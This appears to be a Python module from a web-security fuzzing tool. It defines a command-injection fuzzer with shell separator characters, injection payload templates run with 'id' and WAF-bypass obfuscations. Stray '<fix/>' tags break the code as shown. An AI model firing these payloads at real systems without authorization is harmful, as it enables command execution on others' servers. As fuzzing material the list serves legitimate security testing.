#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class CmdInjection(Fuzzer):

    """CmdInjection"""

    splits = [
        ' ',
        '\t',
        '\x0b',
        ';',
        '\n',
        '\r',
        '\r\n',
        '|',
        '||',
        '&',
        '&&',
        '#',
        '\x00',
        '::',
        '$IFS$9',
        # http://seclists.org/fulldisclosure/2016/Nov/67
        '\x1a',
    ]

    def __init__(self):
        super(CmdInjection, self).__init__()

    <fix/>@classmethod
    def test(cls, cmd="id"):</fix>
        return [
            <fix/>"|%s" % cmd,
            "=%s|'%s'!''" % (cmd, cmd),
            ";%s" % cmd,
            "\n%s" % cmd,
            "`%s`" % cmd,
            "$(%s)" % cmd,
            "${%s}" % cmd,
            "\x00`%s`" % cmd,</fix>
        ]

    <fix/>@classmethod
    def wafbypass(cls):</fix>
        return [
            "i\\d",
            "i''d",
            "/u??/bin/id",
            "a=i;b=d;$a$b",
        ]
